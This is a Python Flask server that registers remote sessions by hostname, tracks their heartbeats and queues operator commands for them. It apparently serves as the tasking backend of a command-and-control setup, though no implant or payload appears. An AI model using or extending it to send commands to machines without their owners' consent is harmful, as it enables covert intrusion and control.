from flask import Flask, request, jsonify
import time
import json
import os
import threading

app = Flask(__name__)

# --- PERSISTENCE SETUP ---
SESSIONS_FILE = 'sessions.json'
SESSIONS = {}
TASKS = {}
sessions_lock = threading.Lock()
tasks_lock = threading.Lock()

def load_sessions():
    """Loads sessions from the JSON file into memory."""
    global SESSIONS
    with sessions_lock:
        if os.path.exists(SESSIONS_FILE):
            try:
                with open(SESSIONS_FILE, 'r') as f:
                    if os.path.getsize(SESSIONS_FILE) > 0:
                        SESSIONS = json.load(f)
                        print(f"[*] Loaded {len(SESSIONS)} sessions from {SESSIONS_FILE}")
            except (json.JSONDecodeError, IOError): SESSIONS = {}
        else: SESSIONS = {}

def save_sessions():
    """Saves the current sessions from memory to the JSON file."""
    with sessions_lock:
        with open(SESSIONS_FILE, 'w') as f:
            json.dump(SESSIONS, f, indent=4)

@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    session_id = data.get("session_id")
    if session_id:
        print(f"[*] New session online: {data.get('hostname')} ({session_id})")
        with sessions_lock:
            SESSIONS[session_id] = {"session_id": session_id, "hostname": data.get("hostname"), "last_seen": time.time()}
        save_sessions()
    return jsonify({"status": "ok"}), 200

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    data = request.json
    session_id = data.get("session_id")
    tasks_for_session = []
    if session_id in SESSIONS:
        with sessions_lock: SESSIONS[session_id]["last_seen"] = time.time()
        with tasks_lock:
            if session_id in TASKS: tasks_for_session = TASKS.pop(session_id, [])
        # No need to save on every heartbeat, registration handles the initial save.
    return jsonify({"status": "ok", "tasks": tasks_for_session})

@app.route('/api/get_sessions', methods=['GET'])
def get_sessions():
    with sessions_lock: return jsonify(list(SESSIONS.values()))

@app.route('/api/delete_session', methods=['POST'])
def delete_session():
    """Permanently deletes a session."""
    data = request.json
    session_id = data.get("session_id")
    if session_id and session_id in SESSIONS:
        with sessions_lock: del SESSIONS[session_id]
        save_sessions()
        print(f"[*] Deleted session: {session_id}")
        return jsonify({"status": "deleted"}), 200
    return jsonify({"status": "not_found"}), 404

@app.route('/api/task', methods=['POST'])
def task_session():
    data = request.json
    session_id, command, args = data.get("session_id"), data.get("command"), data.get("args", {})
    if not all([session_id, command]): return jsonify({"status": "error", "message": "Missing params"}), 400
    if session_id not in SESSIONS: return jsonify({"status": "error", "message": "Session not found"}), 404
    with tasks_lock: TASKS.setdefault(session_id, []).append({"command": command, "args": args})
    print(f"[*] Task '{command}' queued for session {session_id}")
    return jsonify({"status": "tasked"})

def run_server():
    load_sessions()
    app.run(host='0.0.0.0', port=5003)

if __name__ == '__main__':
    run_server()